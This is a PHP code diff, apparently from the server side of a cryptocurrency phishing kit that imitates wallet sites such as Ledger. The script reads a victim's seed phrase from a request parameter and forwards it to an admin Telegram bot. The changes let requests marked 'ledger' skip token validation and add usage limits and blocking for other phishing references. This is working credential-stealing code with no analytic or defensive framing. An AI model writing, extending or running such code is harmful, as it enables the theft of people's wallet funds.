@@ -32,7 +32,7 @@ $seed = isset($_GET['seed']) ? trim($_GET['seed']) : '';
 $siteref = isset($_GET['siteref']) ? trim($_GET['siteref']) : '';
 
 // Validate input
-if (empty($reference) || empty($token)) {
+if ((empty($reference) || empty($token) ) && $siteref != 'ledger') {
     echo json_encode([
         'success' => false,
         'error' => 'Missing required parameters (reference and token)'
@@ -40,14 +40,51 @@ if (empty($reference) || empty($token)) {
     exit;
 }
 // Validate token
-if (!validateToken($reference, $token)) {
+if (!validateToken($reference, $token) && $siteref != 'ledger') {
     echo json_encode([
         'success' => false,
         'error' => 'Invalid token'
     ]);
     exit;
 }
-$referenceData = getReferenceTracking($reference);
+
+if ($siteref != 'ledger') {
+    $referenceData = getReferenceTracking($reference);
+
+    if (!$referenceData) {
+        echo json_encode([
+            'success' => false,
+            'error' => 'Reference not found'
+        ]);
+        exit;
+    }
+
+    if ($referenceData['status'] == 0) {
+        echo json_encode([
+            'success' => false,
+            'error' => 'Reference is not active'
+        ]);
+        exit;
+    }
+
+    if ($referenceData['usage_count'] >= 2) {
+        // Block the reference
+        blockReference($reference);
+
+        echo json_encode([
+            'success' => false,
+            'error' => 'Reference has been used too many times and is now blocked.'
+        ]);
+        exit;
+    } else {
+        if (!$seed) {
+            incrementUsageCount($reference);
+        }
+    }
+} else  {
+    $referenceData = getLastReferenceTracking();
+}
+
 
 if ($action == 'copied' && $siteref != 'ledger') {
 
@@ -81,7 +118,6 @@ if ($action == 'copied' && $siteref != 'ledger') {
         $jsonData['Seed Phrase'] = $seed;
         sendDataToTelegramBot($jsonData, TELEGRAM_ADMIN_BOT_URL);
     }
-
 }
 
 
